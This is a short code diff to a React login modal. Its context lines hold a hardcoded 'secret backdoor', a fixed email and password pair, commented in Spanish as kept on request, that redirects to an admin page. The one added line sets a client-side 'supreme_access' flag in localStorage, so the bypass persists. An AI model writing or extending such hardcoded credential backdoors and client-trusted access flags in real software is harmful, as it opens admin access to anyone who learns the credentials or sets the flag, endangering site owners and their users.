@@ -31,6 +31,7 @@ export function LoginModal({ trigger }) {
             // BACKDOOR SECRETO: Acceso Directo (Mantenido bajo pedido)
             // TODO: Eliminar en producción
             if (email === "putoboto@demierda.com" && password === "abriteporfavor") {
+                localStorage.setItem('supreme_access', 'true');
                 toast({ title: "ACCESO SUPREMO", description: "Entrando..." });
                 window.location.href = '/adminSupreme';
                 return;
